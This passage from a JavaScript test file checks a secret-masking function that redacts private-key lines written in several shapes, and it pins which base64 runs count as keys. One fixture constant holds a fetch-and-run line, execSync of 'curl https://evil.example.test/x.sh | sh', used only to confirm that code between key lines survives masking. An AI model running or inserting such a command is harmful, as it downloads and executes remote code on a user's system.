  const EVIL = "require('child_process').execSync('curl https://evil.example.test/x.sh | sh');";
  const only = (part) => shapes.find((shape) => shape.name.includes(part)).content;
  assert.deepEqual(maskSecrets(only('echo per line'), []).split('\n').slice(1, 6), [...Array.from({ length: 4 }, () => 'echo "[REDACTED]" >> /root/key'), `echo "${KEY_LAST_LINE}" >> /root/key`],
    'an echo per line: the line goes, the command around it stays; the last line is short and decorated, so it shows (the edge that the docs name)');
  assert.ok(maskSecrets(only('"-- " prefix'), []).split('\n').filter((line) => line === '-- [REDACTED]').length === 4, 'a comment prefix stays');
  assert.ok(maskSecrets(only('bytes b"...\\n"'), []).includes('    b"[REDACTED]\\n"\n'), 'b"...\\n": the b, the quotes and the \\n stay');
  assert.equal(maskSecrets(only('backtick-n'), []).split('[REDACTED]').length - 1, 4, 'a one-line key: each of its four long lines is one marker');
  assert.equal(maskSecrets(`${KEY_BEGIN_FRAME}\n-- ${KEY_BODY_LINES[0]}\n${EVIL}\n-- ${KEY_BODY_LINES[1]}\n${KEY_END_FRAME}`, []), `${KEY_BEGIN_FRAME}\n-- [REDACTED]\n${EVIL}\n-- [REDACTED]\n${KEY_END_FRAME}`, 'code among the lines of a decorated key stays whole');
  // the length of a run and the characters of a run: 16 and more, base64 and base64url, up to two = after it
  const body = (text) => `${KEY_BEGIN_FRAME}\n${text}\n${KEY_END_FRAME}`;
  const A15 = 'a'.repeat(15);
  const A16 = 'a'.repeat(16);
  assert.equal(maskSecrets(body(`x = "${A15}"`), []), body(`x = "${A15}"`), 'a run of 15 characters is a word, not a key');
  assert.equal(maskSecrets(body(`x = "${A16}"`), []), body('x = "[REDACTED]"'), 'a run of 16 is');
  assert.equal(maskSecrets(body(`x = "${'a'.repeat(17)}"`), []), body('x = "[REDACTED]"'), 'and of 17 goes whole');
  for (const [label, sign] of [['a plus', '+'], ['a slash', '/'], ['an underscore (base64url)', '_'], ['a dash (base64url)', '-']]) {
    assert.equal(maskSecrets(body(`x = "${'a'.repeat(8)}${sign}${'a'.repeat(8)}"`), []), body('x = "[REDACTED]"'), `${label} is a character of a run`);
  }
  assert.equal(maskSecrets(body(`x = "${'a'.repeat(8)}.${'a'.repeat(8)}"`), []), body(`x = "${'a'.repeat(8)}.${'a'.repeat(8)}"`), 'a dot is not: two words of 8');
  assert.equal(maskSecrets(body(`x = "${A16}=="`), []), body('x = "[REDACTED]"'), 'two = of padding go with the run');
  assert.equal(maskSecrets(body(`x = "${A16}==="`), []), body('x = "[REDACTED]="'), 'a third does not');
  assert.equal(maskSecrets(body(`x = "${A16}="`), []), body('x = "[REDACTED]"'), 'one goes');
  ok(`${shapes.length} shapes of a key as people write it in scripts, comments, strings and one line (the shapes of the fourth audit): maskSecrets and hideKeyBlocks leave no line of the key, keep the frames, the decoration and the code around it, and the length and the characters of a run are pinned`);
}

console.log(`PASS: ${checks} mask checks`);
